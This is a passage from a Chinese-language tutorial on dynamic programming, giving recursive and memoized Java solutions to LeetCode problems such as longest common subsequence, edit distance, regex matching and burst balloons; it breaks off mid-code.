状态：`dp[i][d]`=以nums[i]结尾的，并且公差为d的最长子序列的长度。当d为501时表示还没有确定公差\n- 下一个状态：见递归代码\n- 父子状态之间的递推关系：见递归代码\n- 最后的解答：dp数组中的最大值\n\n##### 递归\n```java\nclass Solution {\n  int[] nums;\n  int ans = 0;\n  public int longestArithSeqLength(int[] nums) {\n    this.nums = nums; \n    dfs(nums.length, 501);\n    return ans;\n  }\n  \n  int dfs(int i, int d) {\n    int res = 0;\n    for (int j = i - 1; j >= 0; j--) {\n      if (d == 501) {\n        // 还没有确定公差\n        res = Math.max(res, dfs(j, i == nums.length ? 501 : nums[i] - nums[j]) + 1);\n      } else {\n        // 确定了公差\n        if (nums[i] - nums[j] == d) {\n          res = Math.max(res, dfs(j, d) + 1);\n        }\n      }\n    }\n    ans = Math.max(ans, res);\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] nums;\n  int ans = 0;\n  Integer[][] dp;\n  public int longestArithSeqLength(int[] nums) {\n    this.nums = nums; \n    dp = new Integer[nums.length][1002];\n    dfs(nums.length, 501);\n    return ans;\n  }\n  \n  int dfs(int i, int d) {\n    int res = 0;\n    for (int j = i - 1; j >= 0; j--) {\n      if (d == 501) {\n        // 还没有确定公差\n        if (dp[j][(i == nums.length ? 501 : nums[i] - nums[j]) + 500] == null) {\n          dp[j][(i == nums.length ? 501 : nums[i] - nums[j]) + 500] = dfs(j, i == nums.length ? 501 : nums[i] - nums[j]);\n        }\n        res = Math.max(res, dp[j][(i == nums.length ? 501 : nums[i] - nums[j]) + 500] + 1);\n      } else {\n        // 确定了公差\n        if (nums[i] - nums[j] == d) {\n          if (dp[j][d + 500] == null) {\n           dp[j][d + 500] = dfs(j, d); \n          }\n          res = Math.max(res, dp[j][d + 500] + 1);\n        }\n      }\n    }\n    ans = Math.max(ans, res);\n    return res;\n  }\n}\n```\n\n关于d范围的技巧：由于 `0 <= nums[i] <= 500`, 综合递增和递减的两个极端，得到 d 的范围 `-500<=d<=500` 我们需要 d 作为下标，而现在 d 又可能是负值，对此，我们统一增加一个偏移量 500，把负的抵消掉，`0<=d’<=1000`。\n\n### 序列上按结尾位置规划之双序列\n#### 分析模版\n- 状态：`dp[i][j]`: 第一个序列的前i个(可以不选中第i位置)配上第二个序列的前j个(可以不选中第j位置)的最优解\n- 下一个状态：`dp[i - 1][j - 1]`, `dp[i - 1][j]`, `dp[i][j - 1]`\n\n#### 例题1: 最长公共子序列\n[最长公共子序列](https://leetcode.cn/problems/longest-common-subsequence/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220620103350.png)\n\n##### 分析\n- 状态：`dp[i][j]`: 第一个序列的前i个配上第二个序列的前j个的最长公共子序列\n- 下一个状态：`dp[i - 1][j - 1]`, `dp[i - 1][j]`, `dp[i][j - 1]`\n- 父子状态之间的递推关系：`dp[i][j] = max{dp[i - 1][j], dp[i][j - 1], dp[i - 1][j - 1] + 1 if A[i] == B[j]}`\n- 最后的解答：`dp[A.length - 1][B.length - 1]`\n\n##### 递归\n```java\nclass Solution {\n  \n  char[] text1Ch;\n  char[] text2Ch;\n  public int longestCommonSubsequence(String text1, String text2) {\n    text1Ch = text1.toCharArray();  \n    text2Ch = text2.toCharArray();  \n    return dfs(text1Ch.length - 1, text2Ch.length - 1);\n  }\n  \n  int dfs(int i, int j) {\n    if (i == -1 || j == -1) {\n      return 0;\n    }\n    int res = Integer.MIN_VALUE;\n    if (text1Ch[i] == text2Ch[j]) {\n      res = Math.max(res, dfs(i - 1, j - 1) + 1);\n    } else {\n      res = Math.max(res, dfs(i - 1, j));\n      res = Math.max(res, dfs(i, j - 1));\n    }\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  \n  char[] text1Ch;\n  char[] text2Ch;\n  Integer[][] dp;\n  public int longestCommonSubsequence(String text1, String text2) {\n    text1Ch = text1.toCharArray();  \n    text2Ch = text2.toCharArray();  \n    dp = new Integer[text1Ch.length][text2Ch.length];\n    return dfs(text1Ch.length - 1, text2Ch.length - 1);\n  }\n  \n  int dfs(int i, int j) {\n    if (i == -1 || j == -1) {\n      return 0;\n    }\n    if (dp[i][j] != null) {\n      return dp[i][j];\n    }\n    int res = Integer.MIN_VALUE;\n    if (text1Ch[i] == text2Ch[j]) {\n      res = Math.max(res, dfs(i - 1, j - 1) + 1);\n    } else {\n      res = Math.max(res, dfs(i - 1, j));\n      res = Math.max(res, dfs(i, j - 1));\n    }\n    dp[i][j] = res;\n    return res;\n  }\n}\n```\n\n##### 递推式动态规划\n```java\nclass Solution {\n  public int longestCommonSubsequence(String text1, String text2) {\n    int text1Length = text1.length();\n    int text2Length = text2.length();\n    int[][] dp = new int[text1Length + 1][text2Length + 1];\n    for (int i = 0; i < text1Length; i++) {\n      for (int j = 0; j < text2Length; j++) {\n        if (text1.charAt(i) == text2.charAt(j)) {\n          dp[i + 1][j + 1] = dp[i][j] + 1;\n        } else {\n          dp[i + 1][j + 1] = Math.max(dp[i][j + 1], dp[i + 1][j]);\n        }\n      }\n    }\n    return dp[text1Length][text2Length];\n  }\n}\n```\n##### 最长公共子序列应用\n###### 例题1: 让字符串成为回文串的最少插入次数\n[让字符串成为回文串的最少插入次数](https://leetcode.cn/problems/minimum-insertion-steps-to-make-a-string-palindrome/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220704163428.png)\n\n分析:\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/qZHjSrmB9iI\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\nclass Solution {\n  public int minInsertions(String s) {\n    String r = new StringBuffer(s).reverse().toString();\n    return s.length() - lcs(s, r);\n  }\n\n  int lcs(String s1, String s2) {\n    int s1Length = s1.length(); \n    int s2Length = s2.length(); \n    int[][] dp = new int[s1Length + 1][s2Length + 1];\n    for (int i = 0; i < s1Length; i++) {\n      for (int j = 0; j < s2Length; j++) {\n        if (s1.charAt(i) == s2.charAt(j)) {\n          dp[i + 1][j + 1] = dp[i][j] + 1;\n        } else {\n          dp[i + 1][j + 1] = Math.max(dp[i][j + 1], dp[i + 1][j]);\n        }\n      }\n    }\n    return dp[s1Length][s2Length];\n  }\n}\n```\n\n###### 例题2: 最长回文子序列\n[最长回文子序列](https://leetcode.cn/problems/longest-palindromic-subsequence/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220704164440.png)\n\n代码：\n```java\nclass Solution {\n  public int longestPalindromeSubseq(String s) {\n    String r = new StringBuffer(s).reverse().toString();\n    return lcs(s, r);\n  }\n  \n  int lcs(String s1, String s2) {\n    int s1Length = s1.length();\n    int s2Length = s2.length();\n    int[][] dp = new int[s1Length + 1][s2Length + 1];\n    for (int i = 0; i < s1Length; i++) {\n      for (int j = 0; j < s2Length; j++) {\n        if (s1.charAt(i) == s2.charAt(j)) {\n          dp[i + 1][j + 1] = dp[i][j] + 1;\n        } else {\n          dp[i + 1][j + 1] = Math.max(dp[i][j + 1], dp[i + 1][j]);\n        }\n      }\n    }\n    return dp[s1Length][s2Length];\n  }\n}\n```\n\n\n#### 例题2: 交错字符串\n[交错字符串](https://leetcode.cn/problems/interleaving-string/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220620134848.png)\n\n##### 分析\n- 状态：`dp[i][j]`：表示的s3前i+j+2个字符s3[0, i+j+1]是否由s1前i+1个字符s1[0...i]和s2前j个字符s2[0...j]交错形成。\n- 下一个状态：`dp[i - 1][j]`, `dp[i][j-1]`\n- 父子状态之间的递推关系：`dp[i][j] = (dp[i-1][j] if s1[i] == s3[i+j+1]) || (dp[i][j-1] if s2[j] == s3[i+j+1])`\n\n##### 递归\n```java\nclass Solution {\n  char[] s1Ch;\n  char[] s2Ch;\n  char[] s3Ch;\n  public boolean isInterleave(String s1, String s2, String s3) {\n    s1Ch = s1.toCharArray();\n    s2Ch = s2.toCharArray();\n    s3Ch = s3.toCharArray();\n    if (s1Ch.length == 0 && s2Ch.length == 0) {\n      if (s3Ch.length == 0) return true;\n      return false;\n    }\n    if (s1Ch.length + s2Ch.length != s3Ch.length) return false;\n    return dfs(s1Ch.length - 1, s2Ch.length - 1);\n  }\n\n  boolean dfs(int i, int j) {\n    if (i == -1 && j == -1) {\n      return true;\n    }\n    if (i != -1 && s1Ch[i] == s3Ch[i + j + 1]) {\n      if (dfs(i - 1, j)) return true;\n    }\n    if (j != -1 && s2Ch[j] == s3Ch[i + j + 1]) {\n      if ((dfs(i, j - 1)) return true;\n    }\n    return false;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  char[] s1CharArr;\n  char[] s2CharArr;\n  char[] s3CharArr;\n  Boolean[][] dp;\n  public boolean isInterleave(String s1, String s2, String s3) {\n    s1CharArr = s1.toCharArray(); \n    s2CharArr = s2.toCharArray();\n    s3CharArr = s3.toCharArray();\n    dp = new Boolean[s1CharArr.length + 1][s2CharArr.length + 1];\n    if (s1CharArr.length == 0 && s2CharArr.length == 0) {\n      if (s3CharArr.length == 0) return true;\n      return false;\n    }\n    if (s1CharArr.length + s2CharArr.length != s3CharArr.length) {\n      return false; \n    }\n    return dfs(s1CharArr.length - 1, s2CharArr.length - 1);\n  }\n\n  boolean dfs(int i, int j) {\n    if (i == -1 && j == -1) {\n      return true;\n    }\n    if (i != -1 && s1CharArr[i] == s3CharArr[i + j + 1]) {\n      if (dp[i][j + 1] == null) {\n        dp[i][j + 1] = dfs(i - 1, j);\n      }\n      if (dp[i][j + 1]) return true;\n    }\n    if (j != -1 && s2CharArr[j] == s3CharArr[i + j + 1]) {\n      if (dp[i + 1][j] == null) {\n        dp[i + 1][j] = dfs(i, j - 1);\n      }\n      if (dp[i + 1][j]) return true;\n    }\n    return false;\n  }\n}\n```\n此处用了一个技巧来处理dp的状态, 因为i与j都可能为-1，会越过dp数组的边界。为了避免这种情况，统一把dp数组里的状态进行+1处理\n\n#### 例题3: 编辑距离\n[编辑距离](https://leetcode.cn/problems/edit-distance/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220704111340.png)\n\n##### 分析\n- 状态：`dp[i][j]`：表示的`word1[0...i]`最少经过多少操作能变成`word2[0...j]`\n- 下一个状态：`dp[i - 1][j - 1], dp[i - 1][j], dp[i][j - 1]`\n- 父子状态之间的递推关系：`dp[i][j] = min{dp[i][j - 1] + 1, dp[i - 1][j - 1] + 1, dp[i - 1][j] + 1, dp[i - 1][j -1] if word1[i] == word2[j]}`\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/QTfM718GuBA\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n##### 递归\n```java\nclass Solution {\n  char[] word1Ch;\n  char[] word2Ch;\n  public int minDistance(String word1, String word2) {\n    word1Ch = word1.toCharArray();  \n    word2Ch = word2.toCharArray();\n    return dfs(word1Ch.length - 1, word2Ch.length - 1);\n  }\n\n  int dfs(int i, int j) {\n    if (i == -1) return j + 1;\n    if (j == -1) return i + 1;\n    int res = Integer.MAX_VALUE;\n    if (word1Ch[i] == word2Ch[j]) {\n      res = Math.min(res, dfs(i - 1, j - 1));\n    }\n    // 删除word1[i]字符\n    res = Math.min(res, dfs(i - 1, j) + 1);\n    // 在word1[i]后面插入word2[j]字符\n    res = Math.min(res, dfs(i, j - 1) + 1);\n    // 替换word1[i]为word2[j]字符\n    res = Math.min(res, dfs(i - 1, j - 1) + 1);\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  char[] word1Ch;\n  char[] word2Ch;\n  Integer[][] dp;\n  public int minDistance(String word1, String word2) {\n    word1Ch = word1.toCharArray();  \n    word2Ch = word2.toCharArray();\n    dp = new Integer[word1Ch.length + 1][word2Ch.length + 1];\n    return dfs(word1Ch.length - 1, word2Ch.length - 1);\n  }\n\n  int dfs(int i, int j) {\n    if (i == -1) return j + 1;\n    if (j == -1) return i + 1;\n    int res = Integer.MAX_VALUE;\n    if (word1Ch[i] == word2Ch[j]) {\n      if (dp[i][j] == null) {\n        dp[i][j] = dfs(i - 1, j - 1);\n      }\n      res = Math.min(res, dp[i][j]);\n    }\n    // 删除word1[i]字符\n    if (dp[i][j + 1] == null) {\n      dp[i][j + 1] = dfs(i - 1, j);\n    }\n    res = Math.min(res, dp[i][j + 1] + 1);\n    // 在word1[i]后面插入word2[j]字符\n    if (dp[i + 1][j] == null) {\n      dp[i + 1][j] = dfs(i, j - 1);\n    }\n    res = Math.min(res, dp[i + 1][j] + 1);\n    // 替换word1[i]为word2[j]字符\n    if (dp[i][j] == null) {\n      dp[i][j] = dfs(i - 1, j - 1);\n    }\n    res = Math.min(res, dp[i][j] + 1);\n    return res;\n  }\n}\n```\n\n此处用了一个技巧来处理dp的状态, 因为i与j都可能为-1，会越过dp数组的边界。为了避免这种情况，统一把dp数组里的状态进行+1处理\n\n#### 例题4: 不同的子序列\n[不同的子序列](https://leetcode.cn/problems/distinct-subsequences/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220704134838.png)\n\n##### 分析\n- 状态：`dp[i][j]`：表示`s[0...i]`的子序列中`t[0..j]`出现的个数\n- 下一个状态：`dp[i - 1][j - 1], dp[i - 1][j]`\n- 父子状态之间的递推关系：`dp[i][j] = dp[i][j - 1] + (dp[i - 1][j - 1] if s[i] == t[j])`\n\n##### 递归\n```java\nclass Solution {\n  char[] sCh;\n  char[] tCh;\n  public int numDistinct(String s, String t) {\n    sCh = s.toCharArray();\n    tCh = t.toCharArray();\n    return dfs(sCh.length - 1, tCh.length - 1);\n  }\n\n  int dfs(int i, int j) {\n    if (j == -1) return 1;\n    if (i == -1) return 0;\n    int res = 0;\n    if (sCh[i] == tCh[j]) {\n      res += dfs(i - 1, j - 1);\n    }\n    res += dfs(i - 1, j);\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  char[] sCh;\n  char[] tCh;\n  Integer[][] dp;\n  public int numDistinct(String s, String t) {\n    sCh = s.toCharArray();\n    tCh = t.toCharArray();\n    dp = new Integer[sCh.length + 1][tCh.length + 1];\n    return dfs(sCh.length - 1, tCh.length - 1);\n  }\n\n  int dfs(int i, int j) {\n    if (j == -1) return 1;\n    if (i == -1) return 0;\n    int res = 0;\n    if (sCh[i] == tCh[j]) {\n      if (dp[i][j] == null) {\n        dp[i][j] = dfs(i - 1, j - 1);\n      }\n      res += dp[i][j];\n    }\n    if (dp[i][j + 1] == null) {\n      dp[i][j + 1] = dfs(i - 1, j);  \n    }\n    res += dp[i][j + 1];\n    return res;\n  }\n}\n```\n\n#### 例题5：正则表达式匹配\n[正则表达式匹配](https://leetcode.cn/problems/regular-expression-matching/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220704144920.png)\n\n##### 分析\n- 状态：`dp[i][j]`：表示`p[0...j]`是否可以匹配`s[0...i]`\n- 下一个状态：`dp[i - 1][j - 1], dp[i - 1][j]`\n- 父子状态之间的递推关系：见递归代码\n\n##### 递归\n```java\nclass Solution {\n  char[] sCh;\n  char[] pCh;\n  public boolean isMatch(String s, String p) {\n    sCh = s.toCharArray();\n    pCh = p.toCharArray();\n    return dfs(sCh.length - 1, pCh.length - 1);\n  }\n\n  boolean dfs(int i, int j) {\n    if (i == -1 && j == -1) return true;\n    if (j == -1) return false; \n    if (i != -1) {\n      if (sCh[i] == pCh[j] || pCh[j] == '.' || (pCh[j] == '*' && j >= 1 && (pCh[j - 1] == sCh[i] || pCh[j - 1] == '.'))) {\n        if (dfs(i - 1, j - 1)) return true;\n      }\n      if (pCh[j] == '*' && j >= 1 && (pCh[j - 1] == sCh[i] || pCh[j - 1] == '.')) {\n        if (dfs(i - 1, j)) return true;\n      }\n    }\n    if (pCh[j] == '*') {\n      if (dfs(i, j - 2)) return true;\n    }\n    return false;\n  } \n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  char[] sCh;\n  char[] pCh;\n  Boolean[][] dp;\n  public boolean isMatch(String s, String p) {\n    sCh = s.toCharArray();\n    pCh = p.toCharArray();\n    dp = new Boolean[sCh.length + 1][pCh.length + 1];\n    return dfs(sCh.length - 1, pCh.length - 1);\n  }\n\n  boolean dfs(int i, int j) {\n    if (i == -1 && j == -1) return true;\n    if (j == -1) return false; \n    if (i != -1) {\n      if (sCh[i] == pCh[j] || pCh[j] == '.' || (pCh[j] == '*' && j >= 1 && (pCh[j - 1] == sCh[i] || pCh[j - 1] == '.'))) {\n        if (dp[i][j] == null) {\n          dp[i][j] = dfs(i - 1, j - 1);\n        }\n        if (dp[i][j]) return true;\n      }\n      if (pCh[j] == '*' && j >= 1 && (pCh[j - 1] == sCh[i] || pCh[j - 1] == '.')) {\n        if (dp[i][j + 1] == null) {\n          dp[i][j + 1] = dfs(i - 1, j);\n        }\n        if (dp[i][j + 1]) return true;\n      }\n    }\n    if (pCh[j] == '*') {\n      if (dp[i + 1][j - 1] == null) {\n        dp[i + 1][j - 1] = dfs(i, j - 2);\n      }\n      if (dp[i + 1][j - 1]) return true;\n    }\n    return false;\n  } \n}\n```\n\n#### 例题6: 通配符匹配\n[通配符匹配](https://leetcode.cn/problems/wildcard-matching/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220704153750.png)\n\n##### 分析\n- 状态：`dp[i][j]`：表示`p[0...j]`是否可以匹配`s[0...i]`\n- 下一个状态：`dp[i - 1][j - 1], dp[i - 1][j], dp[i][j - 1]`\n- 父子状态之间的递推关系：见递归代码\n\n##### 递归\n```java\nclass Solution {\n  char[] sCh;\n  char[] pCh;\n  public boolean isMatch(String s, String p) {\n    sCh = s.toCharArray();\n    pCh = p.toCharArray();\n    return dfs(sCh.length - 1, pCh.length - 1);\n  }\n\n  boolean dfs(int i, int j) {\n    if (i == -1 && j == -1) return true;\n    if (j == -1) return false; \n    if (i >= 0) {\n      if (sCh[i] == pCh[j] || pCh[j] == '?' || pCh[j] == '*') {\n        if (dfs(i - 1, j - 1)) return true; \n      }\n      if (pCh[j] == '*') {\n        if (dfs(i - 1, j)) return true;\n      }\n    }\n    if (pCh[j] == '*') {\n      if (dfs(i, j - 1)) return true;\n    }\n    return false;\n  } \n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  char[] sCh;\n  char[] pCh;\n  Boolean[][] dp;\n  public boolean isMatch(String s, String p) {\n    sCh = s.toCharArray();\n    pCh = p.toCharArray();\n    dp = new Boolean[sCh.length + 1][pCh.length + 1];\n    return dfs(sCh.length - 1, pCh.length - 1);\n  }\n\n  boolean dfs(int i, int j) {\n    if (i == -1 && j == -1) return true;\n    if (j == -1) return false; \n    if (i >= 0) {\n      if (sCh[i] == pCh[j] || pCh[j] == '?' || pCh[j] == '*') {\n        if (dp[i][j] == null) {\n          dp[i][j] = dfs(i - 1, j - 1);\n        }\n        if (dp[i][j]) return true; \n      }\n      if (pCh[j] == '*') {\n        if (dp[i][j + 1] == null) {\n          dp[i][j + 1] = dfs(i - 1, j);\n        }\n        if (dp[i][j + 1]) return true;\n      }\n    }\n    if (pCh[j] == '*') {\n      if (dp[i + 1][j] == null) {\n        dp[i + 1][j] = dfs(i, j - 1);\n      } \n      if (dp[i + 1][j]) return true;\n    }\n    return false;\n  } \n}\n```\n\n#### 例题7: 两个字符串的最小ASCII删除和\n[两个字符串的最小ASCII删除和](https://leetcode.cn/problems/minimum-ascii-delete-sum-for-two-strings/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220704170724.png)\n\n##### 分析\n- 状态：`dp[i][j]`：表示使`s1[0...i]`与`s2[0...j]`相等所需删除字符的 ASCII 值的最小和 \n- 下一个状态：`dp[i - 1][j - 1], dp[i - 1][j], dp[i][j - 1]`\n- 父子状态之间的递推关系：见递归代码\n\n##### 递归\n```java\nclass Solution {\n  char[] s1Ch;\n  char[] s2Ch;\n  public int minimumDeleteSum(String s1, String s2) {\n    s1Ch = s1.toCharArray();\n    s2Ch = s2.toCharArray();\n    return dfs(s1Ch.length - 1, s2Ch.length - 1);\n  }\n\n  int dfs(int i, int j) {\n    int res = Integer.MAX_VALUE;\n    if (i == -1) {\n      res = 0;\n      for (int z = 0; z <= j; z++) {\n        res += s2Ch[z];\n      }\n      return res;\n    }\n    if (j == -1) {\n      res = 0;\n      for (int z = 0; z <= i; z++) {\n        res += s1Ch[z];\n      }\n      return res;\n    }\n    if (s1Ch[i] == s2Ch[j]) {\n      res = Math.min(res, dfs(i - 1, j - 1));\n    }\n    res = Math.min(res, dfs(i - 1, j) + s1Ch[i]);\n    res = Math.min(res, dfs(i, j - 1) + s2Ch[j]);\n    return res; \n  }\n  \n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  char[] s1Ch;\n  char[] s2Ch;\n  Integer[][] dp;\n  public int minimumDeleteSum(String s1, String s2) {\n    s1Ch = s1.toCharArray();\n    s2Ch = s2.toCharArray();\n    dp = new Integer[s1Ch.length + 1][s2Ch.length + 1];\n    return dfs(s1Ch.length - 1, s2Ch.length - 1);\n  }\n\n  int dfs(int i, int j) {\n    int res = Integer.MAX_VALUE;\n    if (i == -1) {\n      res = 0;\n      for (int z = 0; z <= j; z++) {\n        res += s2Ch[z];\n      }\n      return res;\n    }\n    if (j == -1) {\n      res = 0;\n      for (int z = 0; z <= i; z++) {\n        res += s1Ch[z];\n      }\n      return res;\n    }\n    if (s1Ch[i] == s2Ch[j]) {\n      if (dp[i][j] == null) {\n        dp[i][j] = dfs(i - 1, j - 1);\n      }\n      res = Math.min(res, dp[i][j]);\n    }\n    if (dp[i][j + 1] == null) {\n      dp[i][j + 1]= dfs(i - 1, j);\n    }\n    res = Math.min(res, dp[i][j + 1] + s1Ch[i]);\n    if (dp[i + 1][j] == null) {\n      dp[i + 1][j] = dfs(i, j - 1);\n    }\n    res = Math.min(res, dp[i + 1][j] + s2Ch[j]);\n    return res; \n  }\n  \n}\n```\n\n### 序列上按区间规划\n#### 分析模版\n- 状态: `dp[i][j]`: 表示在下表i,j这个区间范围内的最优解\n- 下一个状态: 可以是更小的一个区间`dp[i + 1, j - 1]`, 也可以是不同的切割区间位置dp[i, k], dp[k, j]\n\n#### 例题1: 最长回文子串\n[最长回文子串](https://leetcode.cn/problems/longest-palindromic-substring/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220709140806.png)\n\n##### 分析\n- 状态：`dp[i][j]`: 表示`s[i..j]`是否为一个回文子串\n\n##### 递归\n```java\nclass Solution {\n  int start = 0;\n  int end = 0;\n  char[] sCh;\n  \n  public String longestPalindrome(String s) {\n    int sLength = s.length();\n    sCh = s.toCharArray();\n    for (int i = 0; i < sLength; i++) {\n      for (int j = sLength - 1; j >= 0; j--) {\n        if (j - i  > end - start && dfs(i, j)) {\n          start = i;\n          end = j;\n        }\n      }\n    }\n    return s.substring(start, end + 1);\n  }\n\n  boolean dfs(int l, int r) {\n    if (l == r) return true;\n    if (sCh[l] != sCh[r]) return false;\n    if (l + 1 == r) return true;\n    return dfs(l + 1, r - 1);\n  }\n\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int start = 0;\n  int end = 0;\n  char[] sCh;\n  Boolean[][] dp;\n  \n  public String longestPalindrome(String s) {\n    int sLength = s.length();\n    sCh = s.toCharArray();\n    dp = new Boolean[sLength][sLength];\n    for (int i = 0; i < sLength; i++) {\n      for (int j = sLength - 1; j >= 0; j--) {\n        if (j - i  > end - start && dfs(i, j)) {\n          start = i;\n          end = j;\n        }\n      }\n    }\n    return s.substring(start, end + 1);\n  }\n\n  boolean dfs(int l, int r) {\n    if (l == r) return true;\n    if (sCh[l] != sCh[r]) return false;\n    if (l + 1 == r) return true;\n    if (dp[l + 1][r - 1] == null) {\n      dp[l + 1][r - 1] = dfs(l + 1, r - 1);\n    }\n    return dp[l + 1][r - 1];\n  }\n\n}\n```\n\n#### 例题2: 最长回文子序列\n[最长回文子序列](https://leetcode.cn/problems/longest-palindromic-subsequence/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220709143620.png)\n\n##### 分析\n- 状态：`dp[i][j]`: 表示`s[i..j]`的最长的回文子序列的长度\n- 下一个状态：`dp[i - 1][j - 1], dp[i - 1][j], dp[i][j - 1]`\n- 父子状态之间的递推关系：见递归代码\n\n##### 递归\n```java\nclass Solution {\n  char[] sCh;\n  public int longestPalindromeSubseq(String s) {\n    sCh = s.toCharArray();\n    return dfs(0, sCh.length - 1);\n  }\n\n  int dfs(int i, int j) {\n    if (i == j) return 1;\n    if (i > j) return 0;\n    int res = 0;\n    if (sCh[i] == sCh[j]) {\n      res = Math.max(res, dfs(i + 1, j - 1) + 2);\n    }\n    res = Math.max(res, dfs(i + 1, j));\n    res = Math.max(res, dfs(i, j - 1));\n    return res; \n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  char[] sCh;\n  Integer[][] dp;\n  public int longestPalindromeSubseq(String s) {\n    sCh = s.toCharArray();\n    dp = new Integer[sCh.length][sCh.length];\n    return dfs(0, sCh.length - 1);\n  }\n\n  int dfs(int i, int j) {\n    if (i == j) return 1;\n    if (i > j) return 0;\n    int res = 0;\n    if (sCh[i] == sCh[j]) {\n      if (dp[i + 1][j - 1] == null) {\n        dp[i + 1][j - 1] = dfs(i + 1, j - 1);\n      }\n      res = Math.max(res, dp[i + 1][j - 1]+ 2);\n    }\n    if (dp[i + 1][j] == null) {\n      dp[i + 1][j] = dfs(i + 1, j);\n    }\n    res = Math.max(res, dp[i + 1][j]);\n    if (dp[i][j - 1] == null) {\n      dp[i][j - 1] = dfs(i, j - 1);\n    }\n    res = Math.max(res, dp[i][j - 1]);\n    return res; \n  }\n}\n```\n\n#### 例题3: 戳气球\n[戳气球](https://leetcode.cn/problems/burst-balloons/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220710142746.png)\n\n##### 分析\n\n文字解答：https://leetcode.cn/problems/burst-balloons/solution/\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/M7wQ0YpdiEk\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n##### 递归\n```java\nclass Solution {\n  int[] points;\n  public int maxCoins(int[] nums) {\n    int n = nums.length;\n    points = new int[n + 2]; \n    points[0] = points[n + 1] = 1;\n    for (int i = 1; i <= n; i++) {\n      points[i] = nums[i - 1];\n    }\n    return dfs(0, n + 1);\n  }\n  \n  int dfs(int i, int j) {\n    if (i >= j - 1) {\n      return 0;\n    }\n    int res = -1;\n    for (int k = i + 1; k < j; k++) {\n      res = Math.max(res, dfs(i, k) + dfs(k, j) + points[i] * points[j] * points[k]);\n    }\n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] points;\n  Integer[][] dp;\n  public int maxCoins(int[] nums) {\n    int n = nums.length;\n    points = new int[n + 2]; \n    dp = new Integer[n + 2][n + 2];\n    points[0] = points[n + 1] = 1;\n    for (int i = 1; i <= n; i++) {\n      points[i] = nums[i - 1];\n    }\n    return dfs(0, n + 1);\n  }\n  \n  int dfs(int i, int j) {\n    if (i >= j - 1) {\n      return 0;\n    }\n    int res = -1;\n    for (int k = i + 1; k < j; k++) {\n      if (dp[i][k] == null) dp[i][k] = dfs(i, k);\n      if (dp[k][j] == null) dp[k][j] = dfs(k, j);\n      res = Math.max(res, dp[i][k] + dp[k][j] + points[i] * points[j] * points[k]);\n    }\n    return res;\n  }\n}\n```\n\n#### 例题4: 多边形三角剖分的最低得分\n[多边形三角剖分的最低得分](https://leetcode.cn/problems/minimum-score-triangulation-of-polygon/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220710145116.png)\n\n##### 分析\n这题是例题3:戳气球的套娃题，解题思路一样\n\n##### 递归\n```java\nclass Solution {\n  int[] values;\n  public int minScoreTriangulation(int[] values) {\n    this.values = values;\n    return dfs(0, values.length - 1);\n  }\n\n  int dfs(int i, int j) {\n    if (i >= j - 1) {\n      return 0; \n    }\n    int res = Integer.MAX_VALUE;\n    for (int k = i + 1; k < j; k++) {\n      res = Math.min(res, dfs(i, k) + dfs(k, j) + values[i] * values[k] * values[j]); \n    } \n    return res;\n  }\n}\n```\n\n##### 带有备忘录的递归\n```java\nclass Solution {\n  int[] values;\n  Integer[][] dp;\n  public int minScoreTriangulation(int[] values) {\n    int n = values.length;\n    this.values = values;\n    dp = new Integer[n][n];\n    return dfs(0, n - 1);\n  }\n\n  int dfs(int i, int j) {\n    if (i >= j - 1) {\n      return 0; \n    }\n    int res = Integer.MAX_VALUE;\n    for (int k = i + 1; k < j; k++) {\n      if (dp[i][k] == null) dp[i][k] = dfs(i, k); \n      if (dp[k][j] == null) dp[k][j] = dfs(k, j);\n      res = Math.min(res, dp[i][k] + dp[k][j] + values[i] * values[k] * values[j]); \n    } \n    return res;\n  }\n}\n```\n\n#### 例题5: 切棍子的最小成本\n[切棍子的最小成本](https://leetcode.cn/problems/minimum-cost-to-cut-a-stick/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220710154846.png)\n\n##### 分析\n这题与例题3：戳气球类似\n\n##### 递归\n```java\nclass Solution {\n  int[] cuts;\n  public int minCost(int n, int[] cuts) {\n    this.cuts = cuts;\n    return dfs(0, n);\n  }\n\n  int dfs(int i, int j) {\n    if (i >= j - 1) {\n      return 0;\n    }\n    int res = Integer.MAX_VALUE;\n    